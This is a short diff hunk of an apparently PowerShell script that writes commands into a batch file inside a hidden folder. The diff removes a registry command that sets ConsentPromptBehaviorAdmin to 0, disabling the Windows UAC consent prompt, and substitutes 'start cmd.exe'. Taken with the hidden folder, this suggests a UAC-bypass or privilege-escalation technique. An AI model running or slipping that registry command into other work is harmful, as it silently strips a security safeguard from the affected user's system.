@@ -46,7 +46,7 @@ try {
 
 # Define the command to execute in the batch script
 $CommandsToExecute = @"
-reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v ConsentPromptBehaviorAdmin /t REG_DWORD /d 0 /f
+start cmd.exe
 "@
 
 # Write the commands to a batch script file in the hidden folder
